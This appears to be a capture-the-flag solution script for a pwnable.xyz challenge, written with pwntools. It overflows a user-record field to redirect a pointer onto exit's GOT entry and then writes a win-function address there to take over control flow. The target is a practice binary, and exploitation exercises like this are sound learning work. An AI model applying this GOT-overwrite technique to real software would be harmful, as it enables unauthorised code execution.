from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30011)

sla = r.sendlineafter
sa = r.sendafter

def create_user(name, age):
    sla('> ', '1')
    sa('Name: ', name)
    sla('Age: ', age)

def print_user():
    sla('> ', '2')

def edit_user(name, age):
    sla('> ', '3')
    sa('Name: ', name)
    sla('Age: ', age)

win = 0x400b71
exit_got = 0x602070

create_user('a', '1')
edit_user('a', b'1' + b'a' * 0xf + p64(exit_got))
edit_user(p64(win), '1')

r.interactive()